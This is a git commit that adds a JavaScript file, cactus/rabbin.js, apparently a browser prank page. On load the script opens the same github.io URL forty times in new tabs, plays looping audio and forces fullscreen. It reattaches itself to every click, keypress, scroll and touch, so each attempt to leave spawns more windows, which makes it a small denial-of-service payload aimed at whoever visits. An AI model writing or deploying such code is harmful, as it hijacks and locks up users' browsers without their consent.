d57e3709a578493ba13cc9af4cc2d8e1c10dacd2
TheShitposter78 <83618270+TheShitposter78@users.noreply.github.com>
2022-07-23 15:03:21 -0400

    a

---
+++ cactus/rabbin.js
@@ -0,0 +1,61 @@
+let body = document.documentElement
+function full(){
+    body.requestFullscreen()
+}
+function cactus(){
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    window.open('http://3133.github.io/cactus/', '_blank');
+    var audio = new Audio('out.mp3');
+    audio.loop=true
+    if (audio.paused){
+        audio.play()
+    }
+    full()
+
+}
+cactus()
+body.addEventListener("touchstart", cactus)
+body.addEventListener("keydown", cactus)
+body.addEventListener("scroll", cactus)
+body.addEventListener("mousedoown", cactus)
+body.addEventListener("DOMMouseScroll", cactus)
+body.addEventListener("mousewheel", cactus)
+body.addEventListener("click", cactus)
